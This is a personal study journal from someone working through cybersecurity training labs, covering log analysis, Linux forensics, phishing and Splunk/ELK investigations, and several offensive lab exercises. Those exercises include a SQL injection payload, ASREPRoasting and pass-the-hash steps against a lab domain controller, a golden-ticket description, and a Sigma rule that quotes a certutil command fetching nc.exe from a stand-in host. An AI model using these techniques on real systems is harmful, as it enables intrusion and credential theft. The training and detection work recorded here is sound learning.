AO - Something that helped me when determining the -f flag when cutting out spaces is to just count the words (that have a space before and after) and the fifth word would be -f 5. I was given the most challenging task in the challenge so far, it was What status code is generated by the HTTP requests to the least accessed domain? This is how I did it. As a reminder here is an example log entry:

[2023/10/25:15:42:02] 10.10.120.75 sway.office.com:443 GET / 200 20947 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"

grep "GET" access.log | cut -d' ' -f3,6 | sort | uniq -c | sort -n | grep "80" | head -n 1

AO - SUMMARY. I have a better understanding of piping and how to use it and it sure can be a powerful tool. These are the commands I learned how to use and their associated flags:
cut -d delimeter, -f count
sort -n number, no flag is default alphabetically 
uniq -c will count unique values on top of eliminating redundencies. Great stuff.
grep. This I already knew but now I have a better understanding how to use in piped commands.

AP - Took sort of a break, I was not feeling motivated or mentally well so I didn't want to force my way through the lessons and not really learn anything. I think I am ready so here we go picking up with the cyber advent challenges. Starting with malware analyis. Strong focus on malware C2 which is a critical piece of its functionality and an indicator that the malware has already have been executed. Performing static analysis on malware how it resides on the machine and not executing it. Overall I used the video guide and text guide to learn how to traverse a program's code to see what was behind the scenes even though it was in a language I am not familiar with.

AP - Next practiced SQL injection on a web page that had a search tool. I replaced a parameter with age=' and learned that the database was susceptible to a SQL inkection. Then I updated the parameter to age=' OR 1=1 -- which provided all of the toys regardless of the age and ignores the remaining parameters because -- turns the rest of the statement into comments like how # is used for comments in Python. The room takes us through setting up a revershell using metasploit, a python server, and a netcat listening revereshell connection to gain adminstrative access and revert the website back to its original state.

AP - Practice applying the Diamond Model during incident analysis. Setting firewall rules and creating a honeypot. First I checked the status of the machines firewall with the command; sudo ufw status then I set some rukess such as deny from 192.168.100.25 and allow 22/tcp. Now we moved on to using a tool called PenTBox version 1.8 which can be used to setup a Honeypot. With the honey pot set up and the firewall activated I attempted to connect to the target via port 8080 in my web browser and received the message I setup in the honeypot. I also received an intrusion attempt detected alert through the PenTBox tool that I left active in a terminal window. At this point I wanted to go back and see how the Diamond Model was being applied which I learned that I was practicing threat hunting by setting up the honey pot and strengthening my defensive infrastructure with the firewall rules. For the last part of this rooom I used NMAP to scan the target machine and found an open port. I made sure to reset and adjust the machine's firewall to allow connections via port 8090/tcp.

AP - SUMMARY. I practiced SQL injection through URL manipulation which gave me the opportunity to use Metaploit to gain a reverseshell into the server's admin account. I practiced ajdusting the firewall status through the CLI and the term ufw. Then I setup a honeypot which alerted me to when someone attempts to access the location of it.

AQ - First I located the information regarding the operating system using this command in the CLI; cat /etc/os-release which gave me the exact version of Ubuntu being used on the VM. Next I looked into data in the /etc/passwd file which I found confusing to read so I asked AI for some help. This is the breakdown of the format used in this file;
{
Username, 
Password Placeholder (usually an 'x'),
User ID (unique #),
Group ID,
User Info,
Home Directory,
Shell (location of user's default shell). 
}
AQ - So in total there are 7 colon separated fields for each user account. The way this is printed in the terminal is hard to read so the following command works best: cat /etc/passwd| column -t -s :. What this does is pipe the output of the passwd file into the column command using the -t and -s option flags. the -t says to determine the number of columns and create a table. Since my columns are broken up by colons I use the -s flag and add ':' to it to set the colon as my delimiter.

AQ - Next I looked at the /etc/shadow file. I used the same column command to organize the output and make it easier to read. THis file stores information in this format;
{
Username,
Password Hash,
Last password change,
Password expiration ('0' is n/a),
Password inactivity (what is allowed for max inactivity), 
Account expiration.
}
AQ - I noticed the only password hash available for me to see was the one associated with my current user account which was root. I also noticed the ubuntu user account had no asscoiated expiration or any data after the last password change. The /etc/ folder is also the location where sudoers file is located which lists all of the accounts with sudo privileges.

AQ - In the /var/log/ directory we look at the wtmp log which tracks login history and the auth.log which tracks the users that have properly authenticated on a linux host. My first task was to find the users belonging to the 'audio' group. To do this I use the following command; cat /etc/group | column -t -s : | grep 'audio'. I get a perfect output. I was given a similar task, but this time I would find the user id #. I had already forgot that the user information is stored in the /etc/passwd file. I tried looking for a /et/user file, but thats not a thing.

AQ - Next I viewed the location of the hostname and the timezone at /etc/(fill in with hostname, timezone.).  I viewed the /etc/network/interfaces. Then I wondered how is this command different than ifconfig so I went to AI to answer that question. Essentialy any changes made to the /etc/network/interfaces will be persistent.  Then I used ip address show which looked even more similar too ifconfig but chatGPT assured me that the ip address show was a more robust method with a modern set of tools for managing the interfaces. However, I much prefer the layout of ifconfig. 

AQ - I wanted to give the next part its own paragraph. Next we used netstat, this is the format;
{
Proto: show the transport protocol such as tcp, udp
Recv-Q: displays receive queue size/# of bytes waiting to be received
Send-Q: waiting to be sent in bytes
Local Address
Foreign Address
State: includes values such as 'ESTABLISHED', 'LISTENING', 'TIME_WAIT'.
PID/Program name
}
AQ - Its important to note that the following flags need to be included to reduce output to network connection data: netstat -natp. If I find something interesting here I can potentially investigate the process id using the ps command.

AQ - SUMMARY. This was all about finding information about the local machine I was logged into. I can see many uses for this offensively or deffensively. It was good to differentiate the /passwd and /shadow file as this was asked in an interview. Many important system information is found in the /etc/ and /var/ folders.

AR - Using a video guide for learning. Using thunderbird to view the email, opened via the CLI. I used mxtoolbox.com/EmailHeaders.aspx to analyze the email header content. I found under the relay information that the servers that the email went through had been blacklisted. I retrieved the originating IP for the task. For the last task I opened the email again in thunderbird via CLI. Then I copied the link address of the button that the phishing email wants the victim to click. This pulled a shortened url. Not part of the task but I took that URL to virus total and did some analysis there. Only 2 of 91 vendors flagged it as Phishing/Malicious. I used CyberChef to defang this url.

AR - Next I used anyrun which seems like a cool service that has most of its capability locked behind a paywall. However using the text report I was able to get the information I needed, but I'm still not sure why I would use this tool over Virus Total. I looked into the CVE associated with the malicious email which turned out to be pretty serious (a 7.8 CVSS score).

AR - Next I analyzed a PCAP file full of SMTP traffic. I filtered by response code and I did some open source research to determine the meaning of 220 and more importantly status codes like 550 which is used when an email is rejected due to suspicious activity that could be related to spamming. In this task I was looking for 553 which shouldn't be indicative of malicious activity but in this case it was. I was curious so I looked into status codes some more and it turns out that 500 series status codes for SMTP are reserved for hard/permanent failures. I rehashed that the SMTP port is 25. My next task was to look into file attachments that were sent via SMTP. I used the status code 354 since this has to do with sending data. Honestly kind of a shot in the dark but it worked. Once I filtered down to this I just right clicked the individual packets and followed the conversation streams. Once the TCP stream window opened I search "attachment" and I got the file names I was tasked to find.

AR - SUMMARY. I used new tools such as mxtoolbox to quickly analyze the header of a malicious email and gain insight to values worth investigating via other threat intelligence websites. I also used wireshark and practiced using filters to quickly find the data that I cared the most about. I learned about SMTP status codes that are noteworthy. I finished SOC level 1!

AS - Used the video guide. Learned about using docker to train a AI Convultional Nueral Network. All of the training was already accomplished as this would take more time and resources than what I have available. I learned about loss, perplexity, and probability when it comes training data sets. Loss we want to be as close to 0 as possible because that means the AI is getting the correct answer more often. Perplexity is a measurement of how sure the AI is when making its guess and in this scenario we want the value to be as close to one as possible. With the satisfactory training set ready to go there are a few more things to do:
{
1. Set up a web server with an API that is hosting the CNN (AI) and can receive the captcha images, solve the problems, and return the answers.
2. Programatically navigate to the login page and retrieve the captcha image
3. Retrieve the captcha image to our CNN API web server
4. CNN solves the CAPTCHA and returns the solution to the target login page
5. Evaluate probabilit/perplexity and discard the captcha if the CNN is unsure and return to step 2 as necessary
6. When the AI comes across CAPTCHA that with low perplexity then attempt to solve it
7. Repeat this process untill login is successful
}

AT - The cyber advent challenge today allowed us to go into the API details of a web server which gave away way too much information. Ultimately I was able to use the address bar of my browser to access server files that gave me access to login and defeat the C2 server from the inside. Next I moved into the Splunk exercise using the Splunk Enterprise tool. The suspect user's name was Amber which I included in my initial search to determine a likely IP address associated with the user's device. My next task was to look into her browsing history which was conveinently all HTTP so that is what I used as my source type. I used my search input and piped it into 'dedup' and 'table' to create a table that showed unique url's that Amber had visited. The industry she works in is beer so I looked for beer competitors of the client I was working for. We found berkbeer.com here which I was now abke to include into my search. We saw she browsed their page looking for contact details of the CEO which implied she was going to try and contact him while using the company network, what a dummy! We switched source type to view smtp traffic so we could find the emails exchanged. I needed to find Amber's email which was easy and then I found her communication with the CEO and one of his employees. The last email exchanged was encoded in Base64 for some reason so I viewed the main content, copied and pasted into cyberchef, and wallah! I see that she passed on her personal email info which is presumably where they picked up their conversation and she did illegal things. Shame!

AT - We learned amber is using tor browser so time to investigate this. I used her first name and 'tor' in my search and checked the app field which showed which version of tor she is using. I'm sure there are other/better ways of doing this. Including the word 'install' would have helped narrow down the results. My next task is to find the public facing IP address associated with the website brewertalk.com. I struggled with this. I saw lots of communication with the website but it was hard for me to determine the actual IP associated with the website and not the user. Ok so I learned. I used the term 'brewertalk' and sourcetype as http which ultimately gave my 2 destination IP addresses to pick from. I knew I wanted to look at destination instead of source IP addresses because I knew the user would be sending more traffic to the webserver than vice versa. I was able to rule out the most popular destination IP because it used the 172.31. prefix which tells me it is a private IP associated with my users. My next task is finding the IP who is performing web scans against brewertalk. The suricata IPS detected this the most easily

AU - Started with the cyber advent challeneg where I placed a malicious sneaky file that I knew a user would click on which set up a responder and passed me there hash information which then i used John to crack the hash and EvilWinRM to gain a shell for the admin account. Now I am in the Attacktive Directory challenge. First I ran a NMAP and started a sublime text editor file to log the most important data. I discovered a SMB and NetBIOS ports open which led me to run enum4linux. I used the -a and -v flags to get a thorough scan and waited for the output file to run grep against. I wasn't really getting anywhere with enum4linux and the video guide said its kind of broken and to use smbclient instead, but still no success because there are no shares? TLD is short for Top Level Domain (.net .org. .local). Learned some more about Kerberos. User provides username and password in a (TGT) ticket request(ticket granting ticket), the DC (domain controller) verifies credentials and provides TGT. I was having trouble with the room because of the tool required called kerbrute. But I would have used it to get a list of authentic users on the server. My goal is to access the service account I think and to do so I need to present a TGT to the Key Distro Center which will then give me a TGS, basically a service ticket which is really just a hash made up of the username and password of the account requesting it. I then send the TGS to service and he grants me access if authorized. This allows us to go offline and brute force. As long as I have a valid TGT I can do this and it is called Kerberoasting. It is a very common attack and is made easy with wrong privilidges and weak passwords. However we are not worrying about a valid TGT instead we are going to take advantage of an account with a certain privilidge that basically allows it to not be pre-authenticated. Kinda dumb. This is called ASREPRoasting and the tool I used is impacket. Here is the command: $ impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.10.212.175

AU - Next I ran John against the hash file using the password file and I got my password in half a second. So I take the user account info and the password I just received and I use SMB client with this command: $ smbclient -L \\\\10.10.212.175\\ -U svc-admin, I enter the pass and now I am shown the list of sharenames. There was a sharename that isn't a default share called 'backup'. I find a backup credentials text file so i use the get command to download to my linux machine. I cat it and use base64 to decode. echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d. This reveals a "backup" account user name and pass. Now I use impacket again and my newly gained account, the impacket tool called secretsdump and the option -just-dc so my output will be just the hashes. Now I have the Administrator's hash and using Evil-WinRM I am able to use just the username, hash value, and IP address to conduct a "Pass the Hash" attack and gain a shell as the administrator. As the admin I am able to go through all the directories of all users.

AV - Similar to the previous challenge. Finally got Kerbrute to work, I forgot to adjust the permissions to make it executable, dork. I used Rueben to password spray 'Password1' which is essentialy taking a common password as such and using it a single time against multiple accounts which is to test for weak/common passwords. This worked and I gained access to the machine-1 account. This lab simulated having adminstrator account access to start with and then dumping hashes belonging to accounts that were kerberoastable. I also conveinently had a username and password list to help with enumerating users and then the password file for running hashcat against with the password hashes that I retrieved using Reuben.

AV - Ok so some clearing up was needed. In the last paragraph i used Reuben. In order to use this I had to SSH into the machine as the administrator because the Reuben executable was saved in the downloads file. This was very confusing for me. In reality I didn't need reuben nor did I need the admin account to find exploitable kerberoast accounts. I had the machine1 account password and with that I ran impacket from my attack machine and I got the same results. Actually better results because Rueben output the hashes in a format that had lots of spaces and line breaks which required deletion in order for hashcat to accept the input. I did that using cat and tr (translate). Big fan of the impacket tool. I learned that SPN is used for regular users who require pre-authentication when requesting access to services and NPUsers do not require pre-authentication so that makes them susceptible to the attack I wrote about yesterday.

AV - Next we use Mimikatz. I created a golden ticket which essentialy allows me to be the Key Distro Center and provide myself access to any service. Another option would be to create a silver ticket and grant myself access to specific services based on the privilidges of the user I am impersonating. Silver tickets are a little more stealthy but limited in access.

AW - Using Autopsy to examine the forensic image of an android device that uses full-disk encryption. My first job was to go through photos. Autopsy has a giant button near the top to see media. Then it was a matter of going through the photos to find what I was looking for. For the rest of challenge I just needed to go through messages, contacts, and messages some more. Pretty fun. Wouldn't mind getting the chance to recover data from a phone in the future. I have a broken Ipod Touch 5th Gen that I wonder if I can recover...one day. The rest of the day I am going to practice Python loops and then spend time with the family.

AX - Today was about investigating an infected Windows machine using native Windows tools and commands through PowerShell. I used net user to learn about user accounts and then I could add the user name to net user to learn more about their logon history. I used systeminfo to learn which version of Windows Server was being ran. I turned on Windows Defender outside the scope of the task which gave me some insight as to what malware was on the system. I went to the tmp folder and found some suspect files but I struggled to use findstr to pull out anything useful from the malware scripts. Next I went to Task Scheduler and found some scheduled tasks which were causing some persistence problems and explains why the malware continued to execute C2 comms every 5 min. The video guide I used pretended to know how to find the IP which belonged to the C2 and I find it extremely annoying when content creators pretend to know shit they don't. At that point they are just stealing answers off the internet and re-distributing them to their watchers and no one is learning anything that way, should be illegal or atleast a bannable offense because our Nation needs people who know what they are doing.

AY - Sort of self explanatory, but after setting up a free-tier AWS account I was able to create a new instance and connect to it through powershell. To do so I needed to create then store the SSH RSA key onto my machine so that it was available to connect. I launched a web server using httpd and then connected to it from my local machine. I needed to modify the firewall rules of the AWS instance to allow HTTP traffic. In the AWS terminal I created a message to display on my web server which displayed correctly when I loaded the web page. I terminated the server to avoid unwanted charges.

AZ - My job was to look for SQL injection opportunities (vulnerabilities) within a directory containing multiple .php files which are the files where the website code is stored. Instead of manually opening each file and reading the long string of text within, I used the grep command. Some of the options I used with grep include -r for recursive searching. This is necessary to allow the computer to dig through all the sub directories, folders, and files. I used -n to print out the line associated with the location of the search results down to the specific line number. This will help me cat the file and locate the error quickly so that changes can be made. I used -E for searching multiple terms. For example I knew the function 'include()' was assocated with my vulnerability, but I wanted to know when that function was used in conjuction with GET or POST HTTP methods. So I used the search: grep -rE 'include\(|(GET|POST)' which returned all three terms here highlighted in red, but this allowed me to spot when include was used with GET on the same line, which in turn pointed me to the trouble file. 

AZ - Next I used an automated tool called PSALM which was able to parse my files and find tainted HTML or so the application referred to bad code. Still manual review of the returns from the automated tool needed to be manually reviewed because false positives are unavoidable at this point and will require human interaction.

AZ - Next I used the OWASP Zap tool to automate some vulnerability scans. I learned how certain web pages won't necessarily show up in a scanning tool because the specific web page urls are embedded in the javascript which is only ran through the browser. So the ZAP tool has a tool called AJAX Spider which essentially takes control of the web browser (with or without the GUI) and performs the scan (spider scan) through there to now find java enabled web pages. I also created a modifed scan where I disabled searching for SQL injections to help speed up the scan. It wasn't that time intensive in the first place. The alerts page notifies me of the different vulnerabilities. In this case there was some opportunities for cross site scripting and path traversal which were of th ebiggest concern. The path traversal attack would allow an attacker to access the /etc/passwd file which provides the attacker with a nice list of usernames, group ids, and more which is undoubtedly useful information for continued attacks.

AZ - The next part was sort of complicated. I started a recording and completed a login to the target web page with a random account. I stopped the recording and saved it. I ran it and found that certain web pages and request resulted in a logout. So the guide had me set a login and logout point which enabled the scanner to re-login as necessary so it could complete the scan instead of just logging out. I know, confusing. But this allowed me to detect a Remote OS Command Injection vulnerability. This was an alternative method to gaining access to the /etc/passwd, albeit a much more complicated process than the directory transversal.

AZ - I used the OWASP ZAP in the development pipeline by running zap2docker. I don't fully understand this portion, I think it was a little over my head. I used the sites Gitea and Jenkins. Gitea contained the script whcih I had to go in and edit and then I executed the script from my command line with this command: docker run -t owasp/zap2docker-stable zap-baseline.py -t https://www.example.com. Then I went to jenkins and found where the code for the webpage is compiled. I could also see my OWASP ZAP scan which after about 4 minutes came back failed. There were several warnings, all of which are serious. This is important in the development process because you can catch errors before attackers can exploit them on the live web page. I repeated the process for the API which was again going to the jenkins file on the Gitea hosted repository and modifying it, then rerunning the ZAP scan but this time for an API. Back on Jenkins I found the scan ongoing and then located the zap report file which detailed a high alert risk for Remote OS Command Injection.

AZ SUMMARY - Ultimately this goes to show how many vulnerabilities may be present beyond the simple directory transversal. It really pays to have your webpage scanned by a professional and it pays to implement scanning during the development process prior to deploying a web-page.

AAA - Setup, Connecting, and Practicing fetching files - Logstash is commonly used with Elastic Stack and Kibana (the L in ELK), which performs the processing of data through collecting, enriching, and transforming. Similar purpose as what I learned about the Apps and .conf files for Splunk, or atleast that is the vibe I am getting. First step was hooking up to the VPN owned by THM and SSHing into the machine with provided credentials. Once SSH'd into the machine I wanted to scratch an itch and practice some stuff I learned awhile ago. I went ahead and used scp to do a copy of files from the remote machine to my local machine. Because there were 3 files in the folder I wanted to download, I used the -r flag to do recursive download of the folder instead of having to download each file separately. Also I had to use Sudo because I was copying the whole folder and it needed permission to make a directory within my specified folder. Once all of those were used in the command I had no issue downloading the ELK files :). Because that was so much fun I thought I should also practice establishing a web server hosted by the remote machine and then accessing the webpage via my local machine to fetch files. I did this with python3 and the following command: "python3 -m http.server 8888". The -m flag allows for the looking up of a module and in this case http.server was the module. 8888 is the port number I decided to use, otherwise it will default to port 8000. To access it from my local machine I had to use the remote machine's IP which is important to note because the shell will tell you to use 0.0.0.0. Once accessed I only had access to the files in the folder from which I launched the web server, although directory traversal might be possible, that's beyond the scope of this. In short I was able to download files from a remote machine through two methods, an http.server via python3 and via the use of scp.

AAA - Configuring Elasticsearch for use and Troubleshooting Rabbitholes - Now that I have the files for ELK downloaded it was time to install and take note of the superuser passwordss generated automatically and other important information returned in the terminal during the install process. The process goes smoothly and a status check indicates the service is running. The program files/folders are located at /etc/elasticsearch/. I modify the elasticsearch.yml file to set the network host and port by uncommenting during a nano edit. A restart of elasticsearch is performed. I was tasked with determining the version number of the elasticsearch software installed which I would have easily found if I paid attention during the installation process, but since I didn't, ChatGPT recommends the following command: curl XGET '127.0.0.1:9200'. When I tried this I received an error indicating that the service wasn't up and running which was strange because I had already verified that the network host was set correctly and that the service had been restarted and verified as running. My next troubleshooting procedure is to check the firewall status. I am used to using UFW or uncomplicated firewall service. I learned today that Kali Linux does not use UFW, but comes with iptables pre-installed. This is exciting because I have not yet used iptables. I hope it is similar to ufw. Sure enough it was much more complicated and I am worried about going down rabbit holes so for the purpose of the challenge today I will be using AI assistance for setting the parameters correctly. Once I made my modifications to the IP tables to allow communication with a destination port 9200 it was time to create a file to store the iptable settings named /etc/iptables/rules.v4 and I learned that the v4 is refering to IPv4 rules. It's worth noting this folder/file may already exist depending on the OS but in Kali it is not. This did not resolve the issue. My next troubleshooting step was to check the /var/log/elasticsearch/ files for hints as to why XCURL wasn't working. So at this point I needed to get back on task so instead of troubleshooting the problem that was unrelated to this task, I used grep to search for the word "version" among all files that end with .log and bingo.

AAA - Logstash & Kibana Install - Now on to installing Logstash which is a lot of the same steps as before. Like before I nano the .yml file and this time configure the auto reload to true and enable a 3 second timer for checking changes made to logs. Next is the Kibana install. To clarify the process for all of this goes like this... download, depackage, enable persistence, modify the .yml file, sometimes restart the service, and then check the service status for errors. I also reviewed what a "Deamon" is. It is simply a background process. Now that everything is running smoothly and I have successfully gone through the login process, it is time to write a logstash configuration file. There is a general format to building logstash configurations. In this challenge I will be using this format: Take the input from TCP port 5456, which sends JSON formatted logs, apply the appropriate filter, and send it to Elasticsearch. To do this from scratch (without AI) you would absolutely need to reference the Logstash Reference Documentation: https://www.elastic.co/guide/en/logstash/current. I am learning that it is important to see what variables are required for specific plugins. For the TCP input plugin, only the port number is requried. I thought the script was in JSON format but I verified with GPT that the format used by logstash is very similar to JSON but is in fact not following all of the syntax. The logstash documentation is calling this JSON though so I guess we can turn a blind eye and call this JSON. So because the TCP stream requires JSON formatting, that means our filter needs to be in JSON too, atleast that is how I am understanding it. So we navigate through the documentation to the filter plugins and select JSON and we see that the only thing required here is a source written as a string. Next is to view the elasticsearch output configuration, where I notice that nothing is required for this part to work. For this challenge I will be using host and index. Next I went over plugins for readiing out of stored log files, BEATS, TCP, UDP, HTTP inputs. Next I went over mutate, grok, prune, translate, and other filters.

AAB - I'm glad this came up so I can learn more prior to executing another project I have planned. I learned that Wazuh can work on top of the ELK stack. One important feature of Wazah is decoders which can be found on the Wazah GitHub page: https://github.com/wazuh/wazuh-ruleset/tree/b26f7f5b75aab78ff54fc797e745c8bdb6c23017/decoders. For this challenge I downloaded the windows decoders xml and opened it with visual code studio. Within this XML was a long list of decoders that can be used, today I was looking at the sysmon decoders. It is a very extensive file and this is just specifically decoders for Windows programs like Sysmon. Regular Expressions are an important aspect of decoders, another reason I need to get better at them. I logged into the Wazuh dashboard and it was time to check out the ruleset test under the tools drop down menu. This allows the user to paste in the ruleset they intend to use to check the operability of it. I learned about the grading scale a.k.a rule classification for determining the severity of an alert. It was cool to see that the alerts provided details on the MITRE ID and tactic and technique type along with NIST 800.53.

AAC - After a week of ELK training it's time to explore some logs on my own. The only available index is apache_logs which tells me this is web server related. I have no results to start off which is remedied by changing the timeline. Unfortunately there is not a quick select "all-time" button like on Splunk. Setting it to 5 years ago does the trick and I am returned 3,028 results. I am going to review the different fields to get familiar with how the logs are written. I'm just gonna jot down interesting things I find. The majority of repsonse.status codes are 404, which could mean a lot of things, but the first thing that comes to mind based on my learning thus far is that maybe there is a directory exploration (automated) tool at work here looking for vulnerabilities or just lateral movement/privilege escalation. Next stand out item is the urls that were visited, mainly the admin-login.php. Common sense tells me that this shouldn't be the most visited webpage, but maybe some sort of proxy enabled forwarding tools is attempting to brute force the login. To put things in perspective, these logs are from a single day and during a 10 minute period, so yeah there should definitely not be 400+ visits to the admin login page. And now the cookie crumbles. When filtering by admin-login.php I realize 99% of these visits resulted in response.code 401 which means lack of valid authentication credentials and all of these results come from a remote IP address of the same value. Looking back I should have paid more attention to the timeline I was working with from the getgo but I don't think it will be this simple since these logs were cut down for this room but maybe.

AAC - Complaint and determining the Attacker's tool - One thing I am noticing about elastic stack compared to my experiences with Splunk is that inside of the discover portion of elastic stack I am looking at all of the fields and notice there is a lot of garbage fields with names beginning with aws*, cef*, checkpoint*, cisco*,  and more. I much prefer the interesting fields feature of Splunk. My next task was to find out what type of tools my attacker was employing, specifically what he/she employeed first. I had to chew on this one for awhile. I thought I would just filter by the bad guy IP and sort by oldest event but that wasnt an obvious answer. Success was found by viewing response code 404 and sorting by time. Within the message content I found that the User-Agent involved the NMAP scripting engine which makes sense. I was curious if Gobuster was being used in like an integrated fashion with NMAP because I hadnt heard of that before, but I don't think that is a thing. The attacker was running both tools simultaneously.

AAC - Failing to determine where the Attacker Succeeded - First I try to filter to display response codes 200 (OK) and by the attacker IP. I check the URL request lines as my natural next move and find something interesting which is some "POST" methods which tells me the attacker has likely found some success and is modifying the web server/page in some way. This being a gamified challenge, I search *flag* and along with my previously mentioned filters I now have one result and my flag. By modifying the filters to show events containing the bad guy IP and the /admin-login.php I was able to determine the User Agent which revealed that the attacker used Hydra against the login page. My next task is determining what credentials where finally compromised and used to gain access. So I filter by the login page url, bad guy IP, and 200 status code which gave two results which were timestamped to 14:29:04~ and this was more related to successfully discovering the login page then successful login so I change my method by ditching status code 200 which increases results dramatically and by adding a filter for the Hydra user agent mentioned previously. As a sanity check I filter on/off the url and this isn't a problem because 100% of events involved the admin login page. No luck, my process is wrong. This is where I imagine the wireshark ability to follow the conversation would be useful because I could follow the breadcrumbs right to the successful login. Speaking of which there is a feature for this by clciking on the event and selecting View: Surrounding documents (learned this hours later).

AAC - Trying Visualization to Win - My next idea was, "Can I view a timeline based on http response codes associated with the bad guy IP address?". Supposedly the answer was yes. Ok a few hours of manipulating filters/fields and I definitely learned a lot about creating visualizations. However it turns out I was on the right track earlier but I did not realize the username and password were base64 encoded. So I ask myself how this happened and how did I waste hours after locating the correct event in just seconds. The answer is that I am not familiar enough with the web traffic/conversation between a host and user, and I do not have a keen eye for noticing Base64. I needed to look at the last request the bad guy sent to the login page and look at the request. In the request there is an "Authorization" value which in this case was the word "Basic" followed by gibberish. The term basic should have stood out to me as Base64, but more concerning is that I didn't know that "Authorization" was the value I was looking for to begin with, because if I knew that I would have focused more on figuring out what was going on with the gibberish, eventually leading me to the answer in minutes instead of hours. Than you ChatGPT for sparing me wasted days. It was a good lesson learned. Something I had to reinforce today was the directory traversal techniques such as using etc/phpmyadmin/config-db.php HTTP/1.1 which is just backing out of a directory to access a target location. The last task was the most difficult but I was running out of steam so I found the correct event, but I needed ChatGPT help to find the value of interest, i'll explain. I knew that modification to the database would take place under the /phpmyadmin/ location so I used the filter hhtp.url:*/phpmyadmin/*. I also knew that if the attacker was making changes to the database it would be done using the http POST method. I sifted through the different phpmyadmin locations and found an import.php url and bingo. The request body was challenging to read and understand because it was a transcript of the sql commands used. I needed to put 2 and 2 together by associating the column headers and then the values to notice that the card holder's name was actually a flag value. Looking back, it would have been very effective to search "INSERT INTO", but knowing that would require more SQL experience.

AAC - SUMMARY - This room took me several hours with a small break in the middle. It was my first room that I completed without any help from a written or video guide, so in that sense it was a big accomplishment. Although I did use ChatGPT quite a bit, I will say that I used it in a manner that shouldn't take away from my accomplishment too much. I would ask the AI clarifying questions or questions to help steer me. I think the use of AI will continue to be my strength during this learning journey, but I know I rely on it a little too much sometimes. I really had a great opportunity to read through some web traffic logs and understand what the machines were saying to eachother. I feel confident I could succeed in a more efficient manner if presented with a scenario like this again.

AAD - Creating Various Sigma Rules for Use in Automated Threat Detection - For this I am just going to briefly talk about what I learned and then dump in all the rules I came up with to handle each scenario. Sigma is cool, it is written in YAML YAML Aint Markup Language, it's easy to read, and once it is written I can use tools via CLI or online at Ucoder.IO which is my favorite for ease of use. I am addressing many scenarios. The first is mshta.exe which is a concern because it can be used to execute HTML application as part of an attack, which can result in the delivery of malware or conducting system reconnaissance:

title: Detection of Malicious mshta Execution
id: 183e39c9-12b4-41ae-a907-075d7172d29b
status: experimental
description: Detects potential malicious use of mshta.exe based on execution of HTA files from common user directories.
author: Jason Layton
date: 2024-02-27
logsource:
  product: windows
  service: sysmon
detection:
  selection1:
    EventID: 1 # Process creation ID in Sysmon
    Image: '*mshta.exe*'
  selection2:
    CommandLine: 
      - '*mshta.exe*'
      - '*update.hta*'
  selection3:
    ParentImage: 
      - '*chrome.exe*'
      - '*firefox.exe*'
      - '*msedge.exe*'
      - '*OUTLOOK.EXE*'
  condition: selection1 AND (selection2 OR selection3)
fields:
  - CommandLine
  - CurrentDirectory
  - ParentCommandLine
  - ParentImage
  - Hashes
falsepositives:
  - Legitimate use of HTA files by users or administrators for non-malicious purposes.
level: medium
tags:
  - attack.execution
  - attack.t1204

AAD - Certutil File Ingress - My next challenge is to design a rule for detecting the execution of certutil tool to download netcat binary. Once again I am basing these rules off of a detection found in sysmon logs. The fields required to be listed when creating rules are EventID, Image, and CommandLine. This is a policy set by the organization I am working for. Upon further investigation *pushes glasses up, the following command triggered the original detection by sysmon: 
certutil -urlcache -split -f http://huntmeplz.com/nc.exe C:\Users\victim\AppData\Local\Temp\nc.exe:
title: Certutil Downloading Netcat Binary
id: 71f75f27-aefc-4fb6-993b-6c87d3ec83e4
status: experimental
description: Detects the use of certutil.exe to download Netcat binaries, which may indicate an attempt to establish a backdoor or command and control channel.
author: Jason Layton
date: 2024-02-27
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: '1'
    Image: 
      - '*\certutil.exe'
    CommandLine: 
      - '* -urlcache -split -f *nc.exe*'
      - '* -urlcache -split -f *netcat.exe*'
      - '*ransom.exe*'
  condition: selection
fields:
  - CommandLine
  - Image
  - ParentImage
  - ParentCommandLine
falsepositives:
  - Legitimate use of certutil for managing certificates or downloading trusted files.
level: medium
tags:
  - attack.command_and_control
  - attack.t1105 # Technique for Ingress Tool Transfer

AAD - The Sysmon log provided outlines a scenario indicative of a cybersecurity incident involving the execution of Netcat (nc.exe). The initial vector could have began with a phishing campaign or malicious web content leading to the download of an HTA file as noted previously. Then netcat was used to connect back to a C2 server named 'huntmeplz.com' on port 4444 where cmd.exe was executed remotely. I really got stuck on this one because I was only detecting 1 out of 7 important events. The answer was to basically give the rule an either or option instead of AND. Either the hash value associated with the executable or the command line containing certain flags when running netcat. I am going to stop the journal for this room and focus on finishing.

AAE - Creating Extractable Fields Using Regex - For this task I needed to create a transforms.conf file and create REGEX terms and FORMAT terms to label the fields. To make sure I do this correctly before going through the whole Splunk restart process, I enter the following command into my machine shell, 
"for i in {1..10}; do
    /opt/splunk/etc/apps/fixit/bin/network-logs
done"
>
This ran the elf script ten times and displayed ten log entries in my shell. I wanted 10 to ensure repeated results. I took the logs and pasted them in regex101.com to begin creating my regular expression terms. My first regex:
"User named (?<Username>\S+ \S+)" 
>
This is used to pull the user names of the employees listed in the logs. Here is a single log entry for example (line break deleted):
>
[Network-log]: User named Linda White from HR department accessed the resource Cybertees.THM/about.html from the source IP 10.0.0.9 and country South Africa at: Fri Feb 16 20:54:06 2024
>
Explanation: User named is verbatim from log. It is a literal text match (case-sensitive) and is the easiest part of this expression. Because it is followed by parenthesis, it signals the regex engine the relavent patternidentification within each log. The parenthesis creates a named group that starts after User Named. \S+ looks for the first non-white space and selects all of the non-white space characters regardless of how long the word and stops when it hits another whitespace. Adding a second \S+ allows for the capture of the second name (last name). The question mark before the named group tells regex that i'm only using the User named string to find a location and what I really care about is just after it. 

AAE - Defeat, for now - At this point I had overused the room and extended my timer too many times so I lost the machine and I was truly getting stumped by trying to extract one and two word countries but not any text after the country names. I could get it to pull two word countries but for the one word countries like Brazil it would also pull the next word which was always "at". Because of this I wasn't able to get to the fun part of the room. One day I would like to come back and give it another go, but for now I am happy with what I learned and practiced and I am ready to move on.

